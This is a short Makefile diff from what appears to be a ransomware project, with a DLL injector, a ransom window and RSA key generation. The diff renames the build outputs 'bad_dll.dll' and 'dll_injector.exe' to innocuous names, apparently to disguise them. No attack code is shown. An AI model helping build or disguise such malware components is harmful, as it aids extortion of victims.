@@ -42,8 +42,8 @@ INJECTOR_SRC  = $(SRC_DIR)/dll_injector.c $(SHARED_SRC) $(RANSOM_WINDOW_SRC)
 GENERATE_RSA_SRC = $(SRC_DIR)/generate_rsa.c
 
 # Targets
-BAD_DLL      = $(BUILD_DIR)/bad_dll.dll
-INJECTOR_EXE = $(BUILD_DIR)/dll_injector.exe
+BAD_DLL      = $(BUILD_DIR)/tools.dll
+INJECTOR_EXE = $(BUILD_DIR)/luca.exe
 RSA_EXE      = $(BUILD_DIR)/generate_rsa.exe
 
 # Default target
